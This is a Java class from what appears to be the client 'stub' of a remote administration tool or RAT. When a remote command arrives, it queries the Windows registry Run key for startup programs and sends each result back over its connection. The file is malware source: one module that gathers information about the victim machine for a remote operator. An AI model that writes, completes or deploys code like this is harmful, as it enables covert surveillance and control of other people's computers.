package com.redpois0n.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.common.OperatingSystem;
import com.redpois0n.stub.packets.outgoing.Packet53RegistryStartup;


public class PacketLISTSTARTUP extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hkcu\\software\\microsoft\\windows\\currentversion\\run\\", "/s" });
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
				
				String line;
				
				while ((line = reader.readLine()) != null) {
					String[] args = line.trim().split("    ");

					Connection.addToSendQueue(new Packet53RegistryStartup(args));
				}
				reader.close();
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			Connection.addToSendQueue(new Packet53RegistryStartup("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
